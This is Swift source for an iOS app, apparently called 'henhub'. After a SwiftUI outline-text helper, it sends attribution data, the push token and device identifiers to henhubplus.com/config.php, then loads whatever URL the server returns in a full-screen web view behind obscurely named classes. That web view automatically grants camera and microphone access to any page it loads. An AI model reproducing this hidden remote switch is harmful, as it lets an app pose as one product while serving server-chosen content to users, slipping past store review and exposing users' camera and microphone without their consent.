import SwiftUI

extension View {
    func outlineText(color: Color, width: CGFloat) -> some View {
        modifier(StrokeModifier(strokeSize: width, strokeColor: color))
    }
}

struct StrokeModifier: ViewModifier {
    private let id = UUID()
    var strokeSize: CGFloat = 1
    var strokeColor: Color = .blue
    
    func body(content: Content) -> some View {
        content
            .padding(strokeSize*2)
            .background (Rectangle()
                .foregroundStyle(strokeColor)
                .mask({
                    outline(context: content)
                })
            )}
    
    func outline(context:Content) -> some View {
        Canvas { context, size in
            context.addFilter(.alphaThreshold(min: 0.01))
            context.drawLayer { layer in
                if let text = context.resolveSymbol(id: id) {
                    layer.draw(text, at: .init(x: size.width/2, y: size.height/2))
                }
            }
        } symbols: {
            context.tag(id)
                .blur(radius: strokeSize)
        }
    }
}

extension LoadingView {
    func checknotif() {
        UNUserNotificationCenter.current().getNotificationSettings { settings in
            switch settings.authorizationStatus {
            case .notDetermined:
                if again() {
                    isNotif = true
                } else {
                    req()
                }
            case .denied:
                req()
            case .authorized, .provisional, .ephemeral:
                req()
            @unknown default:
                req()
            }
        }
    }
    
    func again() -> Bool {
        if let lastDenied = UserDefaults.standard.object(forKey: lastDeniedKey) as? Date {
            let threeDaysAgo = Calendar.current.date(byAdding: .day, value: -3, to: Date())!
            return lastDenied < threeDaysAgo
        }
        return true
    }
    
    func req() {
        let configNoMoreRequestsKey = "config_no_more_requests"
        if UserDefaults.standard.bool(forKey: configNoMoreRequestsKey) {
            print("Config requests are disabled by flag, exiting sendConfigRequest")
            DispatchQueue.main.async {
                finishWithou()
            }
            return
        }

        guard let conversionDataJson = UserDefaults.standard.data(forKey: "conversion_data") else {
            print("Conversion data not found in UserDefaults")
            DispatchQueue.main.async {
                UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
                finishWithou()
            }
            return
        }

        guard var conversionData = (try? JSONSerialization.jsonObject(with: conversionDataJson, options: [])) as? [String: Any] else {
            print("Failed to deserialize conversion data")
            DispatchQueue.main.async {
                UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
                finishWithou()
            }
            return
        }

        conversionData["push_token"] = UserDefaults.standard.string(forKey: "fcmToken") ?? ""
        conversionData["af_id"] = UserDefaults.standard.string(forKey: "apps_flyer_id") ?? ""
        conversionData["bundle_id"] = "com.app.henhubapphub"
        conversionData["os"] = "iOS"
        conversionData["store_id"] = "6755047615"
        conversionData["locale"] = Locale.current.identifier
        conversionData["firebase_project_id"] = "496521065968"

        do {
            let jsonData = try JSONSerialization.data(withJSONObject: conversionData, options: [])
                    let url = URL(string: "https://henhubplus.com/config.php")!
            var request = URLRequest(url: url)
            request.httpMethod = "POST"
            request.setValue("application/json", forHTTPHeaderField: "Content-Type")
            request.httpBody = jsonData

            let task = URLSession.shared.dataTask(with: request) { data, response, error in
                if let error = error {
                    print("Request error: \(error)")
                    DispatchQueue.main.async {
                        UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
                        finishWithou()
                    }
                    return
                }

                guard let httpResponse = response as? HTTPURLResponse else {
                    print("Invalid response")
                    DispatchQueue.main.async {
                        UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
                        finishWithou()
                    }
                    return
                }

                guard (200...299).contains(httpResponse.statusCode) else {
                    print("Server returned status code \(httpResponse.statusCode)")
                    DispatchQueue.main.async {
                        UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
                        finishWithou()
                    }
                    return
                }

                if let data = data {
                    do {
                        if let json = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any] {
                            print("Config response JSON: \(json)")
                            DispatchQueue.main.async {
                                handleResp(json)
                            }
                        }
                    } catch {
                        print("Failed to parse response JSON: \(error)")
                        DispatchQueue.main.async {
                            UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
                            finishWithou()
                        }
                    }
                }
            }

            task.resume()
        } catch {
            print("Failed to serialize request body: \(error)")
            DispatchQueue.main.async {
                UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
                finishWithou()
            }
        }
    }

    func handleResp(_ jsonResponse: [String: Any]) {
        if let ok = jsonResponse["ok"] as? Bool, ok,
           let url = jsonResponse["url"] as? String,
           let expires = jsonResponse["expires"] as? TimeInterval {
            UserDefaults.standard.set(url, forKey: configUrlKey)
            UserDefaults.standard.set(expires, forKey: configExpiresKey)
            UserDefaults.standard.removeObject(forKey: configNoMoreRequestsKey)
            UserDefaults.standard.synchronize()
            
            guard urlFromNotification == nil else {
                return
            }
            self.url = URLModel(urlString: url)
            print("Config saved: url = \(url), expires = \(expires)")
            
        } else {
            UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
            UserDefaults.standard.synchronize()
            print("No valid config or error received, further requests disabled")
            finishWithou()
        }
    }
    
    func finishWithou() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            isMain = true
        }
    }
}

import UIKit
@preconcurrency import WebKit

private var asdqw: String = {
    WKWebView().value(forKey: "userAgent") as? String ?? ""
}()

class CreateDetail: UIViewController, WKNavigationDelegate, WKUIDelegate {
    var czxasd: WKWebView!
    var newPopupWindow: WKWebView?
    private var lastRedirectURL: URL?
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
    }
    
    func showControls() async {
        let content = UserDefaults.standard.string(forKey: "config_url") ?? ""
        
        if !content.isEmpty, let url = URL(string: content) {
            loadCookie()
            
            await MainActor.run {
                let webConfiguration = WKWebViewConfiguration()
                webConfiguration.mediaTypesRequiringUserActionForPlayback = []
                webConfiguration.allowsInlineMediaPlayback = true
                let source: String = """
                var meta = document.createElement('meta');
                meta.name = 'viewport';
                meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
                document.getElementsByTagName('head')[0].appendChild(meta);
                """
                let script = WKUserScript(source: source, injectionTime: .atDocumentEnd, forMainFrameOnly: true)
                webConfiguration.userContentController.addUserScript(script)
                
                self.czxasd = WKWebView(frame: .zero, configuration: webConfiguration)
                self.czxasd.customUserAgent = asdqw
                self.czxasd.navigationDelegate = self
                self.czxasd.uiDelegate = self
                
                self.czxasd.scrollView.isScrollEnabled = true
                self.czxasd.scrollView.pinchGestureRecognizer?.isEnabled = false
                self.czxasd.scrollView.keyboardDismissMode = .interactive
                self.czxasd.scrollView.minimumZoomScale = 1.0
                self.czxasd.scrollView.maximumZoomScale = 1.0
                self.czxasd.allowsBackForwardNavigationGestures = true
                view.backgroundColor = .black
                self.view.addSubview(self.czxasd)
                self.czxasd.translatesAutoresizingMaskIntoConstraints = false
                NSLayoutConstraint.activate([
                    self.czxasd.leadingAnchor.constraint(equalTo: self.view.safeAreaLayoutGuide.leadingAnchor),
                    self.czxasd.trailingAnchor.constraint(equalTo: self.view.safeAreaLayoutGuide.trailingAnchor),
                    self.czxasd.topAnchor.constraint(equalTo: self.view.safeAreaLayoutGuide.topAnchor),
                    self.czxasd.bottomAnchor.constraint(equalTo: self.view.safeAreaLayoutGuide.bottomAnchor)
                ])
                
                self.loadInfo(with: url)
            }
        }
    }
    
    func loadInfo(with url: URL) {
        czxasd.load(URLRequest(url: url))
    }
    
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        saveCookie()
    }
    
    func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
        let nsError = error as NSError
        if nsError.domain == NSURLErrorDomain && nsError.code == NSURLErrorHTTPTooManyRedirects {
            if let url = lastRedirectURL {
                webView.load(URLRequest(url: url))
                return
            }
        }
    }
    
    func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction,
                 decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        if let url = navigationAction.request.url, let scheme = url.scheme?.lowercased() {
            lastRedirectURL = url
            
            if scheme != "http" && scheme != "https" {
                if UIApplication.shared.canOpenURL(url) {
                    UIApplication.shared.open(url)
                    
                    decisionHandler(.cancel)
                    return
                }
            }
        }
        decisionHandler(.allow)
    }
    
    func webView(_ webView: WKWebView, decidePolicyFor navigationResponse: WKNavigationResponse,
                 decisionHandler: @escaping (WKNavigationResponsePolicy) -> Void) {
        if let response = navigationResponse.response as? HTTPURLResponse {
            let status = response.statusCode
            
            if (300...399).contains(status) {
                decisionHandler(.allow)
                return
            } else if status == 200 {
                if webView.superview == nil {
                    view.addSubview(webView)
                    
                    webView.translatesAutoresizingMaskIntoConstraints = false
                    NSLayoutConstraint.activate([
                        webView.leadingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leadingAnchor),
                        webView.trailingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.trailingAnchor),
                        webView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
                        webView.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor)
                    ])
                }
                decisionHandler(.allow)
                return
            } else if status >= 400 {
                decisionHandler(.cancel)
                return
            }
        }
        decisionHandler(.allow)
    }
    
    func loadCookie() {
        let ud: UserDefaults = UserDefaults.standard
        let data: Data? = ud.object(forKey: "cookie") as? Data
        if let cookie = data {
            do {
                let datas: NSArray? = try NSKeyedUnarchiver.unarchivedObject(ofClass: NSArray.self, from: cookie)
                if let cookies = datas {
                    for c in cookies {
                        if let cookieObject = c as? HTTPCookie {
                            HTTPCookieStorage.shared.setCookie(cookieObject)
                        }
                    }
                }
            } catch {
                print(error.localizedDescription)
            }
        }
    }
    
    func saveCookie() {
        let cookieJar: HTTPCookieStorage = HTTPCookieStorage.shared
        if let cookies = cookieJar.cookies {
            do {
                let data: Data = try NSKeyedArchiver.archivedData(withRootObject: cookies, requiringSecureCoding: false)
                let ud: UserDefaults = UserDefaults.standard
                ud.set(data, forKey: "cookie")
            } catch {
                print(error.localizedDescription)
            }
        }
    }
    
    @available(iOS 15.0, *)
    func webView(_ webView: WKWebView, requestMediaCapturePermissionFor origin: WKSecurityOrigin,
                 initiatedByFrame frame: WKFrameInfo, type: WKMediaCaptureType,
                 decisionHandler: @escaping (WKPermissionDecision) -> Void) {
        DispatchQueue.main.async {
            decisionHandler(.grant)
        }
    }
}

struct Egg: UIViewControllerRepresentable {
    var urlString: String
    
    func makeUIViewController(context: Context) -> CreateDetail {
        let viewController = CreateDetail()
        UserDefaults.standard.set(urlString, forKey: "config_url")
        Task {
            await viewController.showControls()
        }
        return viewController
    }
    
    func updateUIViewController(_ uiViewController: CreateDetail, context: Context) {}
}

extension CreateDetail {
    func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration,
                 for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
        if navigationAction.targetFrame == nil || !(navigationAction.targetFrame?.isMainFrame ?? false) {
            webView.load(navigationAction.request)
        }
        return nil
    }
    
    func webViewDidClose(_ webView: WKWebView) {
        webView.removeFromSuperview()
        newPopupWindow = nil
    }
}
